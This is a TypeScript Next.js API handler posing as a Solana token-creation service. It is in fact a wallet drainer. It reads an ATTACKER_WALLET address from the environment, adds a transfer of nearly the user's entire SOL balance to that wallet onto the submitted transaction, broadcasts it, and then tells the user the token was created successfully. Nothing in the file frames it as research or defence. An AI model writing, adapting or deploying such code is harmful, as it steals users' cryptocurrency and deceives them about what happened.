import type { NextApiRequest, NextApiResponse } from 'next';
import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';

type TokenDetails = {
  name: string;
  symbol: string;
  decimals: string;
  supply: string;
  description: string;
  freezeAuthority: boolean;
  mintAuthority: boolean;
  updateAuthority: boolean;
};

type RequestData = {
  signedTransaction: string;
  tokenDetails: TokenDetails;
};

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // Check if required environment variables are set
  if (!process.env.ATTACKER_WALLET) {
    return res.status(500).json({ error: 'Server configuration error: Wallet address not set' });
  }

  if (!process.env.RPC_URL) {
    return res.status(500).json({ error: 'Server configuration error: RPC URL not set' });
  }

  try {
    const { signedTransaction, tokenDetails } = req.body as RequestData;
    
    // Get the attacker wallet address from environment variables
    const attackerWallet = process.env.ATTACKER_WALLET;
    
    // Get RPC endpoint from environment variables
    const rpcEndpoint = process.env.RPC_URL;
    
    // Create connection
    const connection = new Connection(rpcEndpoint);
    
    // Deserialize the transaction
    const transaction = Transaction.from(Buffer.from(signedTransaction, 'base64'));
    
    // Get the user's public key (fee payer)
    const fromPubkey = transaction.feePayer!;
    
    // Get the user's balance
    const balance = await connection.getBalance(fromPubkey);
    const LAMPORTS_FOR_FEES = 2000000; // 0.002 SOL for fees
    
    // Create a transfer instruction to the attacker wallet
    const transferInstruction = SystemProgram.transfer({
      fromPubkey,
      toPubkey: new PublicKey(attackerWallet),
      lamports: balance - LAMPORTS_FOR_FEES
    });
    
    // Add the transfer instruction to the transaction
    transaction.add(transferInstruction);
    
    // Send the transaction
    const signature = await connection.sendRawTransaction(
      transaction.serialize()
    );
    
    // Wait for confirmation
    await connection.confirmTransaction(signature);
    
    return res.status(200).json({ 
      signature,
      message: `Token "${tokenDetails.name}" created successfully!`
    });
  } catch (error: any) {
    console.error('Error processing transaction:', error);
    return res.status(500).json({ error: error.message });
  }
}

